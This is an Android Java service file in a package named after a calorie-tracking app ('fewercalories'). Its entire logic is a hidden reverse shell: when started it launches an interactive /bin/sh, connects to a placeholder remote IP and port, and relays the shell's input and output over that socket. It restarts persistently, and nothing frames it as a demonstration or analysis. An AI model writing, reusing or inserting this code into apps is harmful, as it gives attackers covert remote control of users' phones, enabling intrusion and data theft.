package com.geekz.fewercalories;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.Socket;

public class MyService extends Service {
    private final Runnable runnable = new Runnable() {
        @Override
        public void run() {
            try {
                String[] cmd = {"/bin/sh","-i"};
                Process proc = Runtime.getRuntime().exec(cmd);
                InputStream proc_in = proc.getInputStream();
                OutputStream proc_out = proc.getOutputStream();
                InputStream proc_err = proc.getErrorStream();

                Socket socket = new Socket("<IP>", <PORT>);
                InputStream socket_in = socket.getInputStream();
                OutputStream socket_out = socket.getOutputStream();

                while(true){
                    while(proc_in.available()>0)
                        socket_out.write(proc_in.read());
                    while(proc_err.available()>0)
                        socket_out.write(proc_err.read());
                    while(socket_in.available()>0)
                        proc_out.write(socket_in.read());

                    socket_out.flush();
                    proc_out.flush();
                }
            } catch (IOException | StringIndexOutOfBoundsException e) {
                e.printStackTrace();
            }
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(runnable).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
